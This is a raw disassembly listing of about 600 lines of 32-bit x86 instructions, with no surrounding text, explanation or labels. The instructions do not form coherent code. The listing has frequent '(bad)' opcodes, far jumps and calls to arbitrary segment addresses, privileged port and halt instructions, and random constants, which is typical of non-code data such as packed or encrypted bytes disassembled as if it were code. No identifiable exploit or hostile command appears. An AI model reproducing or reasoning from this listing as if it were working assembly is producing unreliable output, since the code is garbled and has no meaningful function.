  41b9ea:	mov    ?,WORD PTR [ebx+0x44]
  41b9ed:	pusha  
  41b9ee:	xchg   esi,eax
  41b9ef:	or     ch,dl
  41b9f1:	adc    ebx,DWORD PTR [esp+ebx*8]
  41b9f4:	jecxz  0x41b9c7
  41b9f6:	mov    al,0x43
  41b9f8:	shl    ah,0x43
  41b9fb:	xor    BYTE PTR [ebp+0x6ad80eed],dh
  41ba01:	fs sbb al,0xb5
  41ba04:	push   ebp
  41ba05:	mov    ebp,DWORD PTR [ebp+0x65040894]
  41ba0b:	xor    eax,0x47c1d579
  41ba10:	jmp    0x7ded:0x2b9267ee
  41ba17:	xor    ch,cl
  41ba19:	inc    eax
  41ba1a:	sub    eax,0xbb94054a
  41ba1f:	sti    
  41ba20:	xchg   esp,eax
  41ba21:	into   
  41ba22:	mov    ebx,0xe7c7fb70
  41ba27:	(bad)  
  41ba28:	push   esp
  41ba29:	mov    ds:0x30412250,eax
  41ba2e:	xchg   esi,eax
  41ba2f:	ja     0x41b9cf
  41ba31:	mov    al,ds:0x83beafa2
  41ba36:	xchg   esi,eax
  41ba37:	fstp   QWORD PTR [edx-0x39]
  41ba3a:	outs   dx,DWORD PTR ds:[esi]
  41ba3b:	mov    al,0x3a
  41ba3d:	inc    esp
  41ba3e:	inc    eax
  41ba3f:	sbb    esp,DWORD PTR [ebx+0x120943c4]
  41ba45:	or     ah,dl
  41ba47:	pop    ecx
  41ba48:	aad    0x90
  41ba4a:	pop    esp
  41ba4b:	jmp    0x457d:0x8c1069bc
  41ba52:	outs   dx,DWORD PTR ds:[esi]
  41ba53:	sbb    BYTE PTR [edi-0x335bd53c],ah
  41ba59:	jle    0x41ba7f
  41ba5b:	cmp    BYTE PTR [eax-0x2c],dh
  41ba5e:	push   esp
  41ba5f:	imul   edx,ebp,0xd2293a03
  41ba65:	mov    ds:0xf84210a9,eax
  41ba6a:	or     dh,bl
  41ba6c:	pop    ds
  41ba6d:	xor    DWORD PTR [ebx],0xffffffb5
  41ba70:	inc    ebx
  41ba71:	cwde   
  41ba72:	cli    
  41ba73:	test   eax,0x16b4ed0f
  41ba78:	jnp    0x41bade
  41ba7a:	jbe    0x41bac1
  41ba7c:	or     al,BYTE PTR cs:[eax]
  41ba7f:	jo     0x41ba30
  41ba81:	test   al,0x9
  41ba83:	jb     0x41ba79
  41ba85:	xchg   esp,eax
  41ba86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba87:	(bad)  
  41ba88:	dec    esi
  41ba89:	hlt    
  41ba8a:	mov    ebp,0xd8915bc1
  41ba8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba90:	aaa    
  41ba91:	ss pop eax
  41ba93:	xchg   ebx,eax
  41ba94:	dec    esi
  41ba95:	stc    
  41ba96:	push   cs
  41ba97:	mov    cl,0xbe
  41ba99:	and    eax,0x43f427f2
  41ba9e:	xchg   ebp,eax
  41ba9f:	dec    edx
  41baa0:	fcmovnu st,st(6)
  41baa2:	fstp   TBYTE PTR [eax]
  41baa4:	fstp   QWORD PTR [edx+ebx*8-0x44e0166]
  41baab:	nop
  41baac:	sub    BYTE PTR ds:0xb0596271,dh
  41bab2:	popa   
  41bab3:	xor    BYTE PTR [ecx+0x44403492],al
  41bab9:	es (bad) 
  41babb:	stc    
  41babc:	loope  0x41bad4
  41babe:	mov    esi,0x4c8be496
  41bac3:	pop    ecx
  41bac4:	push   ss
  41bac5:	adc    ah,BYTE PTR [edx+0x39]
  41bac8:	in     eax,0x41
  41baca:	dec    esp
  41bacb:	push   0x7f1c8ab3
  41bad0:	(bad)  
  41bad1:	dec    DWORD PTR [ecx]
  41bad3:	into   
  41bad4:	jge    0x41bb0c
  41bad6:	out    dx,eax
  41bad7:	enter  0x8fd3,0xb8
  41badb:	push   ds
  41badc:	jb     0x41bb07
  41bade:	cmp    DWORD PTR ds:[eax-0x105d5279],edi
  41bae5:	xor    al,0xe3
  41bae7:	call   0xb57b9484
  41baec:	je     0x41bae0
  41baee:	add    eax,0x422aee82
  41baf3:	retf   
  41baf4:	and    esi,DWORD PTR [eax]
  41baf6:	push   0xffffffa8
  41baf8:	sbb    DWORD PTR [ebp-0x49bd2608],esi
  41bafe:	mov    al,ds:0xce8ddde9
  41bb03:	aam    0xa5
  41bb05:	xchg   ebx,eax
  41bb06:	mov    ebp,0xf977256c
  41bb0b:	push   ebp
  41bb0c:	or     al,0x89
  41bb0e:	repz xchg edi,eax
  41bb10:	in     eax,dx
  41bb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb12:	jbe    0x41ba96
  41bb14:	mov    edi,0xae8b7afb
  41bb1a:	cmp    BYTE PTR [eax+0x37],dh
  41bb1d:	mov    DWORD PTR ds:[eax],eax
  41bb20:	pop    ebp
  41bb21:	hlt    
  41bb22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb23:	adc    bh,BYTE PTR [ebx-0x10]
  41bb26:	lds    ebp,FWORD PTR ss:[edx-0x22e06321]
  41bb2d:	pop    ebp
  41bb2e:	je     0x41bb37
  41bb30:	cmp    dl,BYTE PTR [edi+0x5f08fb62]
  41bb36:	and    eax,0xfef4b847
  41bb3b:	inc    ecx
  41bb3c:	jae    0x41bba5
  41bb3e:	imul   ebp,DWORD PTR [ecx+0x603634c3],0xb64b4349
  41bb48:	shr    DWORD PTR [ebx],1
  41bb4a:	mov    eax,ds:0x24c29de0
  41bb4f:	std    
  41bb50:	cmp    BYTE PTR [edx+0x18],0x46
  41bb54:	mov    edi,gs
  41bb56:	hlt    
  41bb57:	or     esi,ebx
  41bb59:	repnz (bad) 
  41bb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb5c:	mov    edi,esi
  41bb5e:	inc    esp
  41bb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb60:	popf   
  41bb61:	adc    edi,DWORD PTR [ecx]
  41bb63:	out    0x99,al
  41bb65:	mov    dl,0x92
  41bb67:	xchg   esi,eax
  41bb68:	adc    bl,BYTE PTR [esi+0x333b97ab]
  41bb6e:	pushf  
  41bb6f:	xchg   ecx,eax
  41bb70:	stc    
  41bb71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb72:	pop    edx
  41bb73:	sbb    BYTE PTR [ecx-0x5e],ah
  41bb76:	pop    es
  41bb77:	or     edx,DWORD PTR [esi]
  41bb79:	adc    eax,0xd16e0c43
  41bb7e:	mov    es,WORD PTR [edx-0x4f]
  41bb81:	sbb    BYTE PTR [ebp+0x3d],al
  41bb84:	test   BYTE PTR [eax],al
  41bb86:	xchg   edi,eax
  41bb87:	adc    DWORD PTR [ecx+ecx*2-0x58],esp
  41bb8b:	cwde   
  41bb8c:	or     bh,BYTE PTR [ecx]
  41bb8e:	sbb    eax,0x7deef58b
  41bb93:	inc    ecx
  41bb94:	dec    esi
  41bb95:	ret    0xa7df
  41bb98:	(bad)  
  41bb99:	xor    BYTE PTR [eax+edx*2],cl
  41bb9c:	or     edx,DWORD PTR [edi+esi*4-0xc]
  41bba0:	sbb    ebx,DWORD PTR [edi-0x7b15dd51]
  41bba6:	enter  0x71c0,0x62
  41bbaa:	popf   
  41bbab:	jg     0x41bb7e
  41bbad:	icebp  
  41bbae:	scas   eax,DWORD PTR es:[edi]
  41bbaf:	sbb    BYTE PTR [eax+0x22cc667e],dh
  41bbb5:	retf   0xcf85
  41bbb8:	push   0x10
  41bbba:	jecxz  0x41bbcb
  41bbbc:	pop    esi
  41bbbd:	std    
  41bbbe:	dec    esi
  41bbbf:	scas   eax,DWORD PTR es:[edi]
  41bbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbc1:	aas    
  41bbc2:	mov    ds:0xa95d629a,al
  41bbc7:	adc    DWORD PTR [ebp-0x5c95553],esp
  41bbcd:	out    dx,eax
  41bbce:	mov    esi,gs
  41bbd0:	jno    0x41bb6b
  41bbd2:	inc    edx
  41bbd3:	pop    edi
  41bbd4:	stc    
  41bbd5:	adc    eax,0x6c5dc22b
  41bbda:	jg     0x41bbde
  41bbdc:	aam    0x24
  41bbde:	mov    dh,0x51
  41bbe0:	in     al,0x62
  41bbe2:	ret    0x9380
  41bbe5:	or     DWORD PTR [ebp-0x3b],ecx
  41bbe8:	popa   
  41bbe9:	rcr    DWORD PTR ss:[esi-0x4e],cl
  41bbed:	stos   DWORD PTR es:[edi],eax
  41bbee:	dec    eax
  41bbef:	xor    BYTE PTR [edi],0xc4
  41bbf2:	ds in  eax,0x49
  41bbf5:	daa    
  41bbf6:	sbb    dh,al
  41bbf8:	fwait
  41bbf9:	dec    esp
  41bbfa:	pop    edx
  41bbfb:	loopne 0x41bc49
  41bbfd:	shl    BYTE PTR [edx-0x7551c4f4],1
  41bc03:	and    eax,0xf4b64013
  41bc08:	stos   BYTE PTR es:[edi],al
  41bc09:	std    
  41bc0a:	outs   dx,DWORD PTR ds:[esi]
  41bc0b:	mov    ds,WORD PTR [eax+0x72]
  41bc0e:	test   DWORD PTR [esp+ebp*8],edx
  41bc11:	sbb    DWORD PTR [ebx-0x450144f1],edi
  41bc17:	mov    ds:0x698dd577,eax
  41bc1c:	or     cl,BYTE PTR [ebx]
  41bc1e:	in     eax,0x76
  41bc20:	pusha  
  41bc21:	inc    esi
  41bc22:	xchg   edi,eax
  41bc23:	bound  ebp,QWORD PTR [edi+0x3a]
  41bc26:	out    0x42,al
  41bc28:	and    DWORD PTR [esi+ebx*8],0xffffffb2
  41bc2c:	das    
  41bc2d:	ss and esp,esi
  41bc30:	cwde   
  41bc31:	xchg   BYTE PTR [ebx-0x7b],bh
  41bc34:	call   0xffd5:0x6657437e
  41bc3b:	or     DWORD PTR [ecx],edi
  41bc3d:	jbe    0x41bc8d
  41bc3f:	pop    ecx
  41bc40:	(bad)  
  41bc41:	cmp    dh,BYTE PTR [esi]
  41bc43:	(bad)  [edx-0x1fa5ffa0]
  41bc49:	mov    esi,0xb4379d6d
  41bc4e:	sub    al,0x96
  41bc50:	mov    WORD PTR [eax-0x326ab13c],?
  41bc56:	and    dh,BYTE PTR [esi+ebx*8]
  41bc59:	inc    BYTE PTR [ecx]
  41bc5b:	idiv   DWORD PTR [ebx-0x12e10045]
  41bc61:	fwait
  41bc62:	ins    BYTE PTR es:[edi],dx
  41bc63:	in     eax,0x23
  41bc65:	and    al,0xb2
  41bc67:	xchg   edx,eax
  41bc68:	pop    ebx
  41bc69:	ins    BYTE PTR es:[edi],dx
  41bc6a:	into   
  41bc6b:	pop    ecx
  41bc6c:	xchg   esp,eax
  41bc6d:	je     0x41bcb5
  41bc6f:	scas   al,BYTE PTR es:[edi]
  41bc70:	and    BYTE PTR ds:0xaee68ce5,dh
  41bc76:	pop    esi
  41bc77:	and    eax,0xc3d5187c
  41bc7c:	adc    al,0xdd
  41bc7e:	or     dh,ch
  41bc80:	dec    ebp
  41bc81:	std    
  41bc82:	adc    al,0xf6
  41bc84:	repz cdq 
  41bc86:	mov    edi,edi
  41bc88:	(bad)  
  41bc8a:	scas   eax,DWORD PTR es:[edi]
  41bc8b:	cmp    bh,BYTE PTR [ebx+0x3df687dd]
  41bc91:	aaa    
  41bc92:	add    ah,ch
  41bc94:	cmp    ebx,DWORD PTR [eax]
  41bc96:	jb     0x41bc6f
  41bc98:	pop    ss
  41bc99:	or     ebp,DWORD PTR [ebp+0x48]
  41bc9c:	clc    
  41bc9d:	or     DWORD PTR [esi-0x4de141d0],0x1b
  41bca4:	mov    WORD PTR [ebx+0x1],fs
  41bca7:	mov    al,ds:0x7132dc41
  41bcac:	jecxz  0x41bc32
  41bcae:	(bad)  
  41bcaf:	cmp    eax,0x4f5d97db
  41bcb4:	xor    dh,BYTE PTR [eax-0x5e]
  41bcb7:	sub    esp,ecx
  41bcb9:	pop    ebp
  41bcba:	hlt    
  41bcbb:	push   0x9bd48ebb
  41bcc0:	or     ecx,DWORD PTR [ebx]
  41bcc2:	aam    0x7
  41bcc4:	or     BYTE PTR [ebx-0x7b],dl
  41bcc7:	sub    dl,BYTE PTR [esi-0x5e3ddb3]
  41bccd:	sub    al,0xff
  41bccf:	mov    dl,0xff
  41bcd1:	dec    eax
  41bcd2:	hlt    
  41bcd3:	adc    ecx,DWORD PTR [ecx]
  41bcd5:	je     0x41bc75
  41bcd7:	pop    DWORD PTR [esi-0x23]
  41bcda:	mov    esi,0xd604bf95
  41bcdf:	push   edx
  41bce0:	sbb    DWORD PTR [ecx-0x37],eax
  41bce3:	add    ah,BYTE PTR [ebx]
  41bce5:	ins    BYTE PTR es:[edi],dx
  41bce6:	das    
  41bce7:	pop    esi
  41bce8:	mov    bh,0xbc
  41bcea:	jle    0x41bd28
  41bcec:	pop    ss
  41bced:	popf   
  41bcee:	or     DWORD PTR [esi+0x319c0d30],edi
  41bcf4:	in     eax,0xce
  41bcf6:	jnp    0x41bcd0
  41bcf8:	jmp    0x2ef5:0x734ef5dc
  41bcff:	sbb    ah,al
  41bd01:	push   ds
  41bd02:	mov    ah,0x6b
  41bd04:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd06:	ins    BYTE PTR es:[edi],dx
  41bd07:	cli    
  41bd08:	test   eax,0x1784e605
  41bd0d:	fsubr  DWORD PTR [ebx]
  41bd0f:	cmp    bh,BYTE PTR [esp+ecx*2]
  41bd12:	mov    bh,ch
  41bd14:	jle    0x41bccb
  41bd16:	sub    al,0xe
  41bd18:	arpl   WORD PTR [ecx-0x2204aa53],sp
  41bd1e:	pop    eax
  41bd1f:	cmp    al,0x76
  41bd21:	or     eax,0x32e4ca31
  41bd26:	pop    ss
  41bd27:	inc    esp
  41bd28:	xchg   ecx,eax
  41bd29:	clc    
  41bd2a:	sub    DWORD PTR [esi],ebx
  41bd2c:	retf   0x1070
  41bd2f:	ret    
  41bd30:	xchg   DWORD PTR [esi+edi*4-0x48],ebx
  41bd34:	and    BYTE PTR [esi],bh
  41bd36:	pop    ss
  41bd37:	pop    ebx
  41bd38:	dec    esp
  41bd39:	(bad)  
  41bd3b:	ja     0x41bceb
  41bd3d:	inc    esp
  41bd3e:	ret    
  41bd3f:	call   0xcee7e013
  41bd44:	mov    ds:0xb03541a7,eax
  41bd49:	lods   eax,DWORD PTR ds:[esi]
  41bd4a:	mov    cl,BYTE PTR [eax+0x34c76393]
  41bd50:	push   0xfffffff2
  41bd52:	stc    
  41bd53:	xchg   BYTE PTR [edi+0x67],bl
  41bd56:	cmp    esi,DWORD PTR [ebx+edx*1]
  41bd59:	call   0x7b09:0x8bde19e0
  41bd60:	sahf   
  41bd61:	mov    cl,0x16
  41bd63:	push   ds
  41bd64:	in     al,dx
  41bd65:	pop    ds
  41bd66:	mov    esp,0x40cc67e4
  41bd6b:	push   edx
  41bd6c:	mov    eax,0xd1819b2
  41bd71:	jg     0x41bd65
  41bd73:	mov    dl,bh
  41bd75:	mov    edx,0x8df009b7
  41bd7a:	and    eax,ebx
  41bd7c:	xor    BYTE PTR [ecx-0xa047549],dl
  41bd82:	mov    ch,0x41
  41bd84:	test   ch,bl
  41bd86:	push   0xffffffc7
  41bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd89:	outs   dx,DWORD PTR ds:[esi]
  41bd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8b:	bound  esi,QWORD PTR [eax]
  41bd8d:	xchg   ebx,eax
  41bd8e:	adc    DWORD PTR [ebx-0x53e3cce3],0xf6faeb23
  41bd98:	jo     0x41bd44
  41bd9a:	sub    al,0xd8
  41bd9c:	mov    bl,0x88
  41bd9e:	ror    dh,0x71
  41bda1:	mov    eax,0x2b12ed05
  41bda6:	pop    ss
  41bda7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bda8:	push   ebx
  41bda9:	cli    
  41bdaa:	loopne 0x41bd51
  41bdac:	int3   
  41bdad:	sub    al,0x6b
  41bdaf:	inc    BYTE PTR fs:[esi]
  41bdb2:	test   BYTE PTR [ebp-0x9],bh
  41bdb5:	xlat   BYTE PTR ds:[ebx]
  41bdb6:	std    
  41bdb7:	cwde   
  41bdb8:	ja     0x41bd87
  41bdba:	rcr    DWORD PTR [ebx],1
  41bdbc:	inc    ecx
  41bdbd:	pop    edi
  41bdbe:	and    DWORD PTR [ebp+ecx*4+0x6381b46a],0x9c214029
  41bdc9:	push   0xffffffd5
  41bdcb:	jle    0x41be3c
  41bdcd:	cmp    DWORD PTR [edi-0x40],eax
  41bdd0:	push   ebx
  41bdd1:	mov    eax,0x90e422b1
  41bdd6:	or     al,0xb7
  41bdd8:	shr    ch,1
  41bdda:	xor    eax,0xd01f8eb0
  41bddf:	call   DWORD PTR [esi+0x50c4ebf0]
  41bde5:	xchg   ebx,eax
  41bde6:	loopne 0x41be63
  41bde8:	call   0x1ccc185
  41bded:	ins    DWORD PTR es:[edi],dx
  41bdee:	mov    cl,0x52
  41bdf0:	aaa    
  41bdf1:	fwait
  41bdf2:	xchg   DWORD PTR [ebp+0x4d],ebx
  41bdf5:	push   edi
  41bdf6:	ins    BYTE PTR es:[edi],dx
  41bdf7:	clc    
  41bdf8:	xchg   BYTE PTR [esi-0x4dfe615c],cl
  41bdfe:	xor    edi,esp
  41be00:	xchg   cl,ah
  41be02:	(bad)  
  41be04:	pop    ebp
  41be05:	pushf  
  41be06:	stos   DWORD PTR es:[edi],eax
  41be07:	leave  
  41be08:	lock push ecx
  41be0a:	je     0x41be57
  41be0c:	mov    edx,DWORD PTR [eax]
  41be0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be0f:	and    BYTE PTR [ebx-0xbbb4557],0x3a
  41be16:	bound  ecx,QWORD PTR [eax]
  41be18:	xchg   esi,eax
  41be19:	jge    0x41bdf8
  41be1b:	mov    edx,esp
  41be1d:	mov    ds:0x1833a413,eax
  41be22:	push   eax
  41be23:	pop    edx
  41be24:	adc    ah,bl
  41be26:	mov    dh,0x78
  41be28:	add    ecx,DWORD PTR [ecx]
  41be2a:	out    0x9d,eax
  41be2c:	lock push esi
  41be2e:	outs   dx,DWORD PTR ds:[esi]
  41be2f:	or     BYTE PTR [ecx],dh
  41be31:	xchg   ecx,eax
  41be32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be33:	dec    ebx
  41be34:	jmp    0x1dc90ad4
  41be39:	aaa    
  41be3a:	leave  
  41be3b:	nop
  41be3c:	add    eax,0x111f9c1c
  41be41:	arpl   WORD PTR [edi-0x71fdc746],di
  41be47:	or     ah,ch
  41be49:	xor    dl,BYTE PTR ds:0xae13a70e
  41be4f:	jmp    0x95c9:0x155c424f
  41be56:	cmp    DWORD PTR [ebp+0x13fdf71a],ebx
  41be5c:	add    al,BYTE PTR ds:0xcc8624af
  41be62:	mov    ecx,0x919e7273
  41be67:	sar    BYTE PTR ds:0xeacec32f,1
  41be6d:	fst    DWORD PTR [ebx]
  41be6f:	pop    esp
  41be70:	inc    ecx
  41be71:	xor    eax,DWORD PTR [ebx-0x1ba3e213]
  41be77:	jg     0x41beed
  41be79:	jo     0x41be5e
  41be7b:	push   eax
  41be7c:	sbb    BYTE PTR [esi-0x69],ah
  41be7f:	dec    esp
  41be80:	xor    esi,DWORD PTR [eax]
  41be82:	or     eax,0x577a972
  41be87:	xlat   BYTE PTR ds:[ebx]
  41be88:	sub    ecx,DWORD PTR [ebx]
  41be8a:	and    al,0x12
  41be8c:	or     al,dl
  41be8e:	dec    esi
  41be8f:	push   ecx
  41be90:	pop    edx
  41be91:	or     al,0xd8
  41be93:	test   BYTE PTR [edx+0x13e386e9],ch
  41be99:	dec    edx
  41be9a:	ds or  al,0x28
  41be9d:	lods   al,BYTE PTR ds:[esi]
  41be9e:	push   es
  41be9f:	mov    DWORD PTR cs:[ebx-0x80],eax
  41bea3:	cmp    BYTE PTR [edi-0x24],0x19
  41bea7:	mov    eax,ds:0xeb076a96
  41beac:	jecxz  0x41beed
  41beae:	jl     0x41be95
  41beb0:	pop    ss
  41beb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beb2:	mov    bl,0x38
  41beb4:	xchg   edx,eax
  41beb5:	je     0x41be92
  41beb7:	sbb    BYTE PTR [edx-0x68e166cd],al
  41bebd:	dec    eax
  41bebe:	pusha  
  41bebf:	and    al,BYTE PTR [edx-0x58aca9f6]
  41bec5:	scas   al,BYTE PTR es:[edi]
  41bec6:	fmul   st(7),st
  41bec8:	jge    0x41be7b
  41beca:	push   0xffffff8d
  41becc:	mov    bh,0x89
  41bece:	and    edx,ebp
  41bed0:	inc    edi
  41bed1:	pop    ebx
  41bed2:	cs (bad) 
  41bed5:	outs   dx,DWORD PTR ds:[esi]
  41bed6:	add    eax,0x1131800f
  41bedb:	not    esi
  41bedd:	jle    0x41be7e
  41bedf:	mov    dl,0xbc
  41bee1:	addr16 or al,0xdf
  41bee4:	mov    bh,0x61
  41bee6:	pop    ecx
  41bee7:	push   es
  41bee8:	dec    edi
  41bee9:	rcr    BYTE PTR [edx-0x62],cl
  41beec:	pop    eax
  41beed:	jge    0x41bf44
  41beef:	pop    ecx
  41bef0:	(bad)  
  41bef1:	not    DWORD PTR [esi]
  41bef3:	dec    ebx
  41bef4:	add    BYTE PTR [edx],cl
  41bef6:	xchg   esi,eax
  41bef7:	and    BYTE PTR [edx-0x36],0x2d
  41befb:	add    DWORD PTR [ecx+0x7],ebp
  41befe:	adc    al,0x26
  41bf00:	jp     0x41bf4b
  41bf02:	int3   
  41bf03:	mov    al,ds:0xcb008160
  41bf08:	bound  edi,QWORD PTR [edi+0x46475291]
  41bf0e:	iret   
  41bf0f:	sub    dh,BYTE PTR [edi+edi*2+0x43fc6439]
  41bf16:	in     al,0x9d
  41bf18:	xor    DWORD PTR [edi-0x2ed3fcb8],esi
  41bf1e:	xchg   ecx,eax
  41bf1f:	pop    ax
  41bf21:	das    
  41bf22:	pop    ebx
  41bf23:	jae    0x41bf02
  41bf25:	inc    edx
  41bf26:	or     BYTE PTR [ecx-0x66],bl
  41bf29:	fst    QWORD PTR [edx+0x68f1e2a1]
  41bf2f:	out    0xcd,eax
  41bf31:	je     0x41bf0f
  41bf33:	(bad)  
  41bf34:	sbb    al,0x2e
  41bf36:	xchg   DWORD PTR [ebx+0x0],edi
  41bf39:	xchg   ebp,eax
  41bf3a:	sub    eax,0x5fd8567a
  41bf3f:	fisub  WORD PTR [esi-0x17]
  41bf42:	in     eax,0x7
  41bf44:	imul   ebx,esi,0xd
  41bf47:	push   ecx
  41bf48:	pusha  
  41bf49:	cwde   
  41bf4a:	mov    edi,0x90949244
  41bf4f:	(bad)  
  41bf50:	xor    edi,esp
  41bf52:	out    dx,al
  41bf53:	xchg   esi,eax
  41bf54:	in     al,dx
  41bf55:	mov    dh,0x73
  41bf57:	adc    dl,dl
  41bf59:	out    dx,eax
  41bf5a:	aaa    
  41bf5b:	add    BYTE PTR [ecx-0x5a],dl
  41bf5e:	fwait
  41bf5f:	mov    ebp,0xe5271586
  41bf65:	daa    
  41bf66:	push   ss
  41bf67:	pop    ebx
  41bf68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf69:	stc    
  41bf6a:	push   eax
  41bf6b:	lods   eax,DWORD PTR ds:[esi]
  41bf6c:	mov    eax,ds:0x10d327e6
  41bf71:	addr16 jb 0x41bf37
  41bf74:	and    al,0x22
  41bf76:	call   0x12ac:0xb0753fe2
  41bf7d:	test   BYTE PTR [esi+0x2a],al
  41bf80:	mov    dh,0xbe
  41bf82:	pop    ecx
  41bf83:	adc    DWORD PTR [esi],ebp
  41bf85:	call   0xda615709
  41bf8a:	inc    eax
  41bf8b:	mov    dl,0x70
  41bf8d:	lea    esi,[ebx+0x15]
  41bf90:	div    ebx
  41bf92:	cmp    al,0xf1
  41bf94:	ins    DWORD PTR es:[edi],dx
  41bf95:	mov    bl,0xbb
  41bf97:	push   ss
  41bf98:	xchg   ebp,eax
  41bf99:	outs   dx,DWORD PTR ds:[esi]
  41bf9a:	push   ecx
  41bf9b:	(bad)  
  41bf9c:	out    dx,al
  41bf9d:	inc    ebx
  41bf9e:	ds mov esi,0x9206cd95
  41bfa4:	and    eax,0x96e686dd
  41bfa9:	stos   DWORD PTR es:[edi],eax
  41bfaa:	arpl   WORD PTR [eax-0x6d],bp
  41bfad:	push   ds
  41bfae:	push   0xffffffc9
  41bfb0:	in     al,0x15
  41bfb2:	mov    ah,BYTE PTR [esi-0x54]
  41bfb5:	jle    0x41bf56
  41bfb7:	lock xor ecx,esi
  41bfba:	adc    DWORD PTR [eax+0x35928b85],esp
  41bfc0:	cmp    DWORD PTR [ebp+0x48],esp
  41bfc3:	sub    DWORD PTR [ecx],0xd22b6348
  41bfc9:	pusha  
  41bfca:	dec    eax
  41bfcb:	jo     0x41bf6f
  41bfcd:	pushf  
  41bfce:	mov    esp,0xaacc1392
  41bfd3:	not    BYTE PTR [edx-0x31]
  41bfd6:	cdq    
  41bfd7:	jae    0x41bfcc
  41bfd9:	cmp    eax,0x955a83cb
  41bfde:	cld    
  41bfdf:	test   dh,ah
  41bfe1:	and    al,0xdc
  41bfe3:	sbb    eax,0x73691cf3
  41bfe8:	call   0x722b:0x9823
  41bfee:	cdq    
  41bfef:	dec    esp
  41bff0:	xor    al,0x66
  41bff2:	enter  0x67a0,0x60
  41bff6:	leave  
  41bff7:	pop    ebp
  41bff8:	outs   dx,BYTE PTR ds:[esi]
  41bff9:	data16 adc BYTE PTR [eax+eax*8-0x125cbf0],bh
  41c001:	sub    ebx,DWORD PTR [ebx]
  41c003:	loopne 0x41bffe
  41c005:	fidivr WORD PTR [ecx+0x2f3aa0e8]
  41c00b:	adc    DWORD PTR [eax-0x42],ebx
  41c00e:	xchg   edi,eax
  41c00f:	pop    edi
  41c010:	pushf  
  41c011:	fmul   QWORD PTR [edi-0x34f2dc75]
  41c017:	pop    ebx
  41c018:	and    esp,DWORD PTR [ebp+ebp*4-0x64]
  41c01c:	cs push 0x2ad69df9
  41c022:	push   edi
  41c023:	add    al,0xee
  41c025:	adc    BYTE PTR [ebp-0x346bd2d],bl
  41c02b:	xchg   ecx,eax
  41c02c:	sbb    al,0xfa
  41c02e:	pop    esp
  41c02f:	fsubr  st(1),st
  41c031:	pushf  
  41c032:	data16 cli 
  41c034:	push   eax
  41c035:	fsubr  DWORD PTR [ecx]
  41c037:	not    bl
  41c039:	pop    ebp
  41c03a:	clc    
  41c03b:	outs   dx,BYTE PTR ds:[esi]
  41c03c:	ja     0x41c012
  41c03e:	out    0x56,eax
  41c040:	mov    eax,ds:0x65848de1
  41c045:	mov    bl,0xc9
  41c047:	cwde   
  41c048:	mov    bh,0xe4
  41c04a:	dec    ebp
  41c04b:	stos   DWORD PTR es:[edi],eax
  41c04c:	push   edx
  41c04d:	shl    al,0x92
  41c050:	lods   eax,DWORD PTR ds:[esi]
  41c051:	loopne 0x41c00b
  41c053:	call   0x9bb84fb6
  41c058:	add    ecx,edx
  41c05a:	jno    0x41c0ca
  41c05c:	inc    ecx
  41c05d:	push   ds
  41c05e:	mov    ebx,DWORD PTR [ebx-0x4b]
  41c061:	pop    ebx
  41c062:	push   ecx
  41c063:	sub    eax,0xd2059ff
  41c068:	shl    BYTE PTR [ecx-0xa],cl
  41c06b:	dec    DWORD PTR [esi+ebx*8+0x4c60d461]
  41c072:	jp     0x41c06c
  41c074:	loopne 0x41c066
  41c076:	test   eax,0xb3b42b9a
  41c07b:	popa   
  41c07c:	mov    ecx,DWORD PTR [eax-0x47c5889a]
  41c082:	push   eax
  41c083:	sbb    dh,BYTE PTR [edx+0x7e]
  41c086:	inc    eax
  41c087:	mov    ecx,0xefb1a0d0
  41c08c:	xchg   ebp,eax
  41c08d:	add    ebp,DWORD PTR [eax+0xab42153]
  41c093:	push   edi
  41c094:	xor    cl,bl
  41c096:	loope  0x41c019
  41c098:	retf   
  41c099:	sbb    al,0x6a
  41c09b:	daa    
  41c09c:	jg     0x41c06b
  41c09e:	mov    eax,0x653e939f
  41c0a3:	pushf  
  41c0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0a5:	scas   eax,DWORD PTR es:[edi]
  41c0a6:	push   0x4e9d6ad3
  41c0ab:	out    0x11,eax
  41c0ad:	or     ah,ch
  41c0af:	and    eax,edx
  41c0b1:	fild   WORD PTR [edi+0x38]
  41c0b4:	(bad)  
  41c0b5:	out    0x25,eax
  41c0b7:	in     eax,dx
  41c0b8:	dec    ebp
  41c0b9:	mov    dh,0x87
  41c0bb:	cmp    bl,0x8f
  41c0be:	or     ebx,DWORD PTR [eax]
  41c0c0:	inc    ebx
  41c0c1:	sahf   
  41c0c2:	int3   
  41c0c3:	repz jns 0x41c0a1
  41c0c6:	push   ss
  41c0c7:	jbe    0x41c060
  41c0c9:	retf   
  41c0ca:	jb     0x41c051
  41c0cc:	bts    DWORD PTR [ecx+0x41],ebp
  41c0d0:	mov    al,ds:0x4cd9162c
  41c0d5:	bound  ebp,QWORD PTR [eax]
  41c0d7:	cwde   
  41c0d8:	std    
  41c0d9:	xchg   BYTE PTR [edx+0x520acb23],bl
  41c0df:	retf   
  41c0e0:	inc    esp
  41c0e1:	jg     0x41c0d8
  41c0e3:	jae    0x41c118
  41c0e5:	outs   dx,DWORD PTR ds:[esi]
  41c0e6:	cmp    al,0xd6
  41c0e8:	jne    0x41c118
  41c0ea:	xchg   ebp,eax
  41c0eb:	(bad)  ds:0x17bc7f4f
  41c0f1:	sbb    DWORD PTR [eax+0x6b],esi
  41c0f4:	std    
  41c0f5:	push   edx
  41c0f6:	sub    eax,0x3acece66
  41c0fb:	jmp    0xe303a352
  41c100:	out    0xc,eax
  41c102:	clc    
  41c103:	shl    ebp,0xf0
